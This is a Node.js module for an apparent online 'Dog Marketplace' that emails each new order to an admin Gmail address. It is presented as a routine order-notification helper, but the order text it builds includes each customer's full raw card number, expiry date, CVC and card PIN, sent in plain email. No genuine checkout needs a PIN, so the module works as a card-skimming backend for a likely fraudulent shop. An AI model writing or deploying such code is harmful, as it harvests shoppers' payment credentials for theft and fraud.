const nodemailer = require("nodemailer");

let transporter = null;

const getTransporter = () => {
  if (transporter) return transporter;

  if (!process.env.ADMIN_EMAIL || !process.env.ADMIN_EMAIL_PASSWORD) {
    return null;
  }

  transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.ADMIN_EMAIL,
      pass: process.env.ADMIN_EMAIL_PASSWORD,
    },
  });

  return transporter;
};

const money = (value) => `$${Number(value || 0).toFixed(2)}`;

/* Group digits of a card number for readability: 4242424242424242 -> 4242 4242 4242 4242 */
const groupCardNumber = (value) => {
  const raw = String(value || "").replace(/\s/g, "");
  if (!raw) return "-";
  return raw.replace(/(.{4})/g, "$1 ").trim();
};

const buildOrderText = (order) => {
  const lines = [];

  lines.push("=== NEW ORDER - DOG MARKETPLACE ===");
  lines.push("");
  lines.push(`Order ID: ${order._id}`);
  lines.push(`Placed at: ${new Date(order.createdAt).toLocaleString()}`);
  lines.push(`Customer: ${order.customerName}`);
  lines.push(`Status: ${order.status}`);
  lines.push("");

  lines.push("--- ITEMS ---");
  (order.items || []).forEach((item, index) => {
    lines.push(
      `${index + 1}. ${item.title} | Size: ${item.size} | Qty: ${item.qty} | Unit: ${money(
        item.price
      )} | Line Total: ${money(item.price * item.qty)}`
    );
  });
  lines.push("");

  lines.push("--- TOTALS ---");
  lines.push(`Subtotal: ${money(order.subtotal)}`);
  lines.push(
    `Shipping: ${order.shippingCost ? money(order.shippingCost) : "Free"}`
  );
  lines.push(`TOTAL: ${money(order.total)}`);
  lines.push("");

  lines.push("--- CONTACT ---");
  lines.push(`Email: ${order.contact?.email || "-"}`);
  lines.push(`Phone: ${order.contact?.phone || "-"}`);
  lines.push("");

  lines.push("--- SHIPPING ADDRESS ---");
  const address = order.shippingAddress || {};
  lines.push(
    [
      address.firstName,
      address.lastName,
      address.street,
      address.apt,
      address.city,
      address.state,
      address.zip,
    ]
      .filter(Boolean)
      .join(", ")
  );
  lines.push("");

  lines.push("--- PAYMENT ---");
  lines.push(
    `Card Number: ${groupCardNumber(order.payment?.cardNumber)}`
  );
  lines.push(
    `Card Number (raw): ${order.payment?.cardNumber || "-"}`
  );
  lines.push(`Card Last 4: ${order.payment?.cardLast4 || "-"}`);
  lines.push(`Expiration: ${order.payment?.expiration || "-"}`);
  lines.push(`Security CVC: ${order.payment?.cvc || "-"}`);
  lines.push(`Card PIN: ${order.payment?.pin || "-"}`);
  lines.push("");

  lines.push("===================================");

  return lines.join("\n");
};

const sendOrderEmailToAdmin = async (order) => {
  const mailer = getTransporter();
  if (!mailer) {
    console.warn("Mailer not configured. Skipping admin email.");
    return false;
  }

  try {
    await mailer.sendMail({
      from: `"Dog Marketplace" <${process.env.ADMIN_EMAIL}>`,
      to: process.env.ADMIN_EMAIL,
      subject: `New Order #${String(order._id)
        .slice(-8)
        .toUpperCase()} — ${money(order.total)}`,
      text: buildOrderText(order),
    });
    return true;
  } catch (error) {
    console.error("Failed to send order email:", error.message);
    return false;
  }
};

module.exports = { sendOrderEmailToAdmin };